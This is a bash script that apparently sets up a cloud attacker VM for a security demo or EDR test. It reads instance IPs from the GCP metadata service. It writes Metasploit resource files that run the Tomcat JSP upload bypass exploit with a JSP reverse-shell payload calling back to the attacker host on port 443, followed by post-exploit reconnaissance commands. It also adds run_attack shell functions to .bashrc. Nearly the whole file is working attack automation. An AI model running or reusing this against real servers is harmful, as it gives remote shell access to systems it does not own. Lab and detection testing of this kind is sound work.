#!/bin/bash

LHOST=$(curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip);
PRIVATE_IPADDRESS=$(curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip);
TARGET_PORT='80';
LPORT='443';
ZONE=$(curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/zone | cut -d'/' -f4)
REGION=${ZONE::-2}
TARGET_ADDRESS=$(gcloud compute forwarding-rules list --format="get(IPAddress)")

startup ()
{
	#clear;
	create_kali_macros;
	setup_aliases;
	exit;
}

create_kali_macros ()
{
	# shellcheck disable=SC2024
	sudo cat >/home/ubuntu/configure.rc <<EOL
use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOSTS ${TARGET_ADDRESS}
set LHOST ${LHOST}
set rport ${TARGET_PORT}
set LPORT ${LPORT}
EOL
	

	# shellcheck disable=SC2024
	sudo cat >/home/ubuntu/startup.rc <<EOL
use exploit/multi/http/tomcat_jsp_upload_bypass
set rhosts ${TARGET_ADDRESS}
set rport ${TARGET_PORT}
set LHOST ${LHOST}
set LPORT ${LPORT}
set REVERSELISTENERBINDADDRESS ${PRIVATE_IPADDRESS}
set AutoRunScript post_exploit.rc
set payload java/jsp_shell_reverse_tcp
exploit -j
EOL

	# shellcheck disable=SC2024
	sudo cat >/home/ubuntu/post_exploit.rc <<'EOL'
whoami
netstat -ano
bash crowdstrike_test_high
EOL
	sudo chown ubuntu:ubuntu /home/ubuntu/*.rc
}

setup_aliases ()
{
	# shellcheck disable=SC2024
	sudo cat >>/home/ubuntu/.bashrc <<'EOL'
function check_tomcat() {
	while true; do
	  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://${TARGET_ADDRESS}:${TARGET_PORT}")
	  if [ "$STATUS" -eq "200" ]; then
		echo "Tomcat is now ready!";
		break
	  else
		echo "Tomcat not ready yet..."
	  fi
	  sleep 10
	done
}

function run_attack() {
	check_tomcat;
	echo "Running Metasploit";
	msfconsole -qx "use exploit/multi/http/tomcat_jsp_upload_bypass;\
	set RHOSTS ${TARGET_ADDRESS};\
	set RPORT ${TARGET_PORT};\
	exploit"
}

function run_attack_auto() {
	check_tomcat;
	echo "Running Metasploit";
	msfconsole -qr startup.rc;
}

PROMPT=$'%F{%(#.white.red)}${debian_chroot:+($debian_chroot)──}(%B%F{%(#.yellow.white)}%n@%m%b%F{%(#.white.red)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.white.red)}]%B%(#.%F{yellow}#.%F{white}$)%b%F{reset} '
EOL
	#sudo chown kali:kali /home/kali/.zshrc
}

startup;
